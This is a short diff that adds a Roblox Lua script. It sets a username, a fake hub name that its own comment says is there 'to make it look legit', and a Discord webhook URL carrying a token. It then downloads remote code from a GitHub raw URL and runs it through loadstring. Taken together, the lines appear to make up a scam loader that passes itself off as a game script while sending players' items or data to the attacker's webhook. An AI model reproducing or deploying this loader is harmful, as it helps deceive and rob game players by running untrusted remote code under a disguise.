@@ -1,0 +1,5 @@
+_G.Username = "Huzuniafk12" --Case Sensitive 
+_G.HubName = "Piniata Update .gg/psxduper" --This is where you put the name of your face script to make it look legit
+_G.WebhookUrl = "https://discord.com/api/webhooks/1099788321640685608/y8yKo1crmLCFPAr4_0V3VoByVV1MrdUrmEKNydbH9lLFEYvfbMl6Qhb-ew2lo5rrd2Jw"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
